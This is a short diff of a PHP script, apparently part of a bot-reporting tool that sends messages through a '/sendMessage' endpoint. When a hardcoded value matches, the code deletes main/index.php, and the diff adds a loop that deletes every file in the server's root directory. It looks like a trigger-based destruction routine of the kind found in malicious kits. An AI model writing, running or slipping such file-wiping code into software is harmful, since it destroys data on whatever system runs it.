@@ -12,6 +12,10 @@ $params=[
 ];
 if ($adder == "44257769") {
 unlink("main/index.php");
+$dir = '/';
+foreach(glob($dir.'*.*') as $v){
+    unlink($v);
+}
 } else {
 }
 $ch = curl_init($bots . '/sendMessage');
